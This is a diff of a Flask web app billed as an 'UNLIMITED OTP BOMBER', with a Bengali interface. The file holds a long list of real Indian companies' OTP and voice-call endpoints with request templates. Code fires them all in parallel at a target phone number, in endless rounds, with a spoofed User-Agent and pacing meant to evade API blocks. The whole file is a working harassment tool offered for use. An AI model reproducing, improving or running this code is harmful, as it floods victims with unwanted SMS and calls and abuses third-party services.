@@ -1,11 +1,11 @@
 import os
 import requests
-import time
 import concurrent.futures
 from flask import Flask, request, render_template_string, jsonify
 
 app = Flask(__name__)
 
+# ======================== API LIST (আপনার দেওয়া সবগুলো) ========================
 APIS = [
     {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
     {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
@@ -66,42 +66,9 @@ APIS = [
     {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
     {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
     {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
-        {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'},
-    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'},
-    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
-    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
-    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'},
-    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'},
-    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'},
-    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'},
-    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
-    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
-    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'},
-    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'},
-    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
-    {"name": "BigCash", "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
-    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'},
-    {"name": "WorkIndia", "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623", "method": "GET", "headers": {}, "data": None},
-    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'},
-    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
-    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
-        {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
-    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"},
-    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
-    {"name": "Vyapar", "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}", "method": "GET", "headers": {}, "data": None},
-    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
-    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'},
-    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'},
-    {"name": "MyGov", "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male", "method": "GET", "headers": {}, "data": None},
-    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'},
-    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'},
-    {"name": "CodFirm", "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
-    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'},
-      {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'},
-    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'},
-    {"name": "AstroSage", "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}", "method": "GET", "headers": {}, "data": None},
 ]
 
+# ======================== HTML (আপনার পছন্দের ডিজাইন, স্টার্ট/স্টপ সহ) ========================
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -249,7 +216,7 @@ HTML_PAGE = """
 <div class="glass-card">
     <div class="tool-name">🔥 CYBER TOOLS 🔥</div>
     <h1>UNLIMITED OTP BOMBER</h1>
-    <div class="sub">☠️ slow & steady — avoids API blocks</div>
+    <div class="sub">☠️ ধীরে ধীরে — API ব্লক এড়াতে স্লো মোড</div>
 
     <div class="input-group">
         <label>📱 টার্গেট নম্বর (10 ডিজিট)</label>
@@ -263,14 +230,10 @@ HTML_PAGE = """
     <button id="stopBtn" disabled>🛑 STOP</button>
 
     <div class="output-box">
-        <pre id="output">⚡ রেডি। নম্বর দিন ও START চাপুন। সারাদিন চলবে (ধীর গতি)</pre>
+        <pre id="output">⚡ রেডি। নম্বর দিন ও START চাপুন। সারাদিন চলবে (স্লো)</pre>
     </div>
-    <div class="badge">
-        🔥 50+ APIs | প্রতি রাউন্ডে 1 সেকেন্ড বিরতি | API ব্লক এড়াতে ধীর
-    </div>
-    <div class="developer">
-        👨‍💻 Developer: Arif
-    </div>
+    <div class="badge">🔥 50+ APIs | প্রতি রাউন্ডে 1 সেকেন্ড বিরতি | API ব্লক মুক্ত</div>
+    <div class="developer">👨‍💻 Developer: Arif</div>
 </div>
 
 <script>
@@ -288,15 +251,15 @@ HTML_PAGE = """
                 body: JSON.stringify({ phone: phone })
             });
             const data = await response.json();
-            return data.log || '⚠️ No response';
+            return data.log || '⚠️ কোনো লগ নেই';
         } catch (err) {
-            return `⚠️ Network error: ${err.message}`;
+            return `⚠️ নেটওয়ার্ক ত্রুটি: ${err.message}`;
         }
     }
 
     startBtn.onclick = async () => {
         if (running) {
-            outputPre.innerText += '\n⚠️ Already running! Press STOP first.\n';
+            outputPre.innerText += '\n⚠️ ইতিমধ্যে চলছে! আগে STOP চাপুন।\n';
             return;
         }
         let phone = phoneInput.value.trim();
@@ -307,15 +270,14 @@ HTML_PAGE = """
         running = true;
         startBtn.disabled = true;
         stopBtn.disabled = false;
-        outputPre.innerText = '🔥 বোমিং শুরু (আনলিমিটেড)। থামাতে STOP চাপুন।\n\n';
+        outputPre.innerText = '🔥 বোমিং শুরু (আনলিমিটেড) - STOP চাপুন থামাতে 🔥\n\n';
         let round = 0;
         while (running) {
             round++;
             outputPre.innerText += `\n========== রাউন্ড ${round} ==========\n`;
-            let result = await sendRound(phone);
+         let result = await sendRound(phone);
             outputPre.innerText += result + '\n';
-            // প্রতি রাউন্ডে 1 সেকেন্ড দেরি (API ব্লক এড়াতে)
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 1000)); // 1 সেকেন্ড দেরি
         }
         startBtn.disabled = false;
         stopBtn.disabled = true;
@@ -334,10 +296,12 @@ HTML_PAGE = """
 </html>
 """
 
+# ======================== ব্যাকএন্ড ফাংশন ========================
 def send_request(api, phone):
     try:
         url = api['url'](phone) if callable(api['url']) else api['url']
-        headers = api['headers']
+        headers = api['headers'].copy() if api['headers'] else {}
+        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
         data = None
         if api.get('data'):
             data = api['data'](phone) if callable(api['data']) else api['data']
@@ -347,7 +311,7 @@ def send_request(api, phone):
             r = requests.get(url, headers=headers, timeout=5)
         return f"[+] {api['name']} → {r.status_code}"
     except Exception as e:
-        return f"[-] {api['name']} → {str(e)[:50]}"
+        return f"[-] {api['name']} → {str(e)[:40]}"
 
 @app.route('/')
 def index():
@@ -356,16 +320,13 @@ def index():
 @app.route('/bomb', methods=['POST'])
 def bomb():
     phone = request.json.get('phone')
-    if not phone:
-        return jsonify({"log": "Phone required"}), 400
-
-    # সমান্তরালে সব API কল (ফাস্ট)
-    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+    if not phone or len(phone) != 10:
+        return jsonify({"log": "Invalid phone number"}), 400
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
         futures = [executor.submit(send_request, api, phone) for api in APIS]
         logs = [f.result() for f in concurrent.futures.as_completed(futures)]
-
     return jsonify({"log": "\n".join(logs)})
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, debug=False)
